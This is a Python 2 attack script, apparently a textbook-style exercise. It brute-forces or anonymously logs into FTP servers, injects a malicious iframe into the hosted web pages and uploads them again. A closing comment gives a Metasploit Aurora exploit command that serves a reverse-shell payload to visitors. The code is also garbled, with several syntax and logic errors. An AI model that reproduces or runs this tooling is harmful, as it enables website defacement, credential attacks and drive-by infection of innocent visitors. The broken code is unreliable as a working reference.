import ftplib
import optparse
import time

class bcolors:

    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

def anonLogin(hostname):
	try:
		ftp=ftplib.FTP(hostname)
		ftp.login('anonymous','me@your.com') #can put anything as the pass
		print '\n[*] ' + str(hostname) + bcolors.OKGREEN +\
		" FTP anonymous login succesfull"+bcolors.ENDC
		ftp.quit()
		return True
	except Exception as e:
	print '\n[-] '+str(hostname)+\
	' FTP anonymous login FAILED'
	return False

''' FilaZilla stores credentials in open text'''
def bruteLogin(hostname,passwdFile):
	pF=open(passwdFile,'r')
	for line in pF.readlines():
		time.sleep(1)
		userName=line.split(':').[0]
		passWord=line.split(':')[1].strip('\r').strip('\n')
		print "[+] Trying: "+str(userName)+'/'+passWord
		try:
			ftp=ftplib.FTP(hostname)
			ftp.login(userName,passWord)
			print '\n[*] '+ str(hostname) + bcolors.OKGREEN +\
			" FTP login succesfull: "+ str(userName) +'/'+passWord + bcolors.ENDC
			ftp.quit()
			return(userName,passWord)
		except Exception as e:
			pass
	print bcolors.FAILED "\n[-] Could not brute force the credentials "
	return(None,None)

def returnDefault(ftp):
	try:
		dirList=ftp.nlst() #the nlst command list the dic=rectory contents
	except:
		dirList=[]
		print "[-] Cound not list any directorty content"
		print "[-] Scipping to next target "
		return
	retList=[]
	for filename in dirList:
		fn = filename.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print '[+] Found default page: '+ filename
			retList.append(filename)
	return retList
def injectPage(ftp,page,redirect):
	f=open(page + '.tmp','w')
	ftp.retrlines('RETR ' + page , f.write)
	print '[+] Download Page: ' + page
	f.write(redirect)
	f.close()
	print bcolors.OKBLUE+ "[+] Injected Malecious iframe on: "+ page + bcolors.ENDC
	ftp.storlines('STOR '+page, open(page+'.tmp'))
	print bcolors.OKGREEN + "[+] Uploaded Injected page: "+ page

# redirect='<iframe src="IP OF THE COMMAND AND CONTROL SERVER"></iframe>'
''' The IP be me listening on a port for incoming connection setup by metasploit'''

def attack(userName,passWord,trgHost, redirect):
	ftp=ftplib.FTP(trgHost)
	ftp.login(userName,passWord)
	defPages=returnDefault(ftp)
	for defPage in defPages:
		injectPage(ftp,defPage,redirect)

def main():
	parser=optparse.OptionParser('usage: %prog -H <target host[s]> -r <redirect page> [-f <userpass file>] ')
	parser.add_option('-H',dest='trgHosts',type='string',help='Enter the target host ')
	parser.add_option('-f',dest='passwdFile',type='string',help='specify the user/password file')
	parser.add_option('-r',dest='redirect',type='string',help='specify a redirection page')
	(options,args)=parser.parse_args()
	trgHosts=options.trgHosts
	passwdFile=options.passwdFile
	redirect=options.redirect

	if trgHost==None or redirect==None:
		print parser.usage
		exit(0)
	for trgHost in trgHosts:
		username=None
		password=None
		if anonLogin(trgHost)==True:
			username='anonymous'
			password='me@your.com'
			print '[+] using anonymous creds to login'
		attack(username,password,trgHost,redirect)
		elif passwdFile!=None:
			(username,password)=bruteLogin(trgHost,passwdFile)
		if password!=None:
			print '[+] Using Creds: ' + username+'/'+password+\
			' to attack'
			attack(username,password,trgHost,redirect)

if __name__ == '__main__':
	main()
'''
creating the control and command server using metasploit :

msfcli exploit/windows/browser/ms10_002_aurora
LHOST=10.10.101.120 SRVHOST=10.10.101.120 URIPATH=/exploit
PAYLOAD=windows/shell/reverse_tcp LHOST=10.10.10.112 LPORT=443 E

'''









